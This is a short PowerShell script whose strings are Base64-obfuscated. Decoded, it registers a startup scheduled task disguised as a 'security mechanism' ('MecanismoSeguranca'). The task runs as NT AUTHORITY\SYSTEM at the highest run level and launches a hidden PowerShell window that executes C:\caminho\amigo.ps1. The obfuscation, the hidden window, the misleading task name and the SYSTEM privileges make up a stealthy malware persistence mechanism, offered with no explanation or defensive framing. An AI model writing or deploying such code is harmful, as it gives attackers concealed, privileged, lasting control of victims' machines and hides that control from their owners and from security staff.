$Cso23v = New-ScheduledTaskAction -Execute ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cG93ZXJzaGVsbC5leGU='))) -Argument ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LU5vUHJvZmlsZSAtV2luZG93U3R5bGUgSGlkZGVuIC1GaWxlIEM6XGNhbWluaG9cYW1pZ28ucHMx')))
$d6pumM = New-ScheduledTaskTrigger -AtStartup
$bqAHt = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries

Register-ScheduledTask -TaskName ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TWVjYW5pc21vU2VndXJhbmNh'))) -User ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TlQgQVVUSE9SSVRZXFNZU1RFTQ=='))) -Action $Cso23v -Trigger $d6pumM -Settings $bqAHt -RunLevel Highest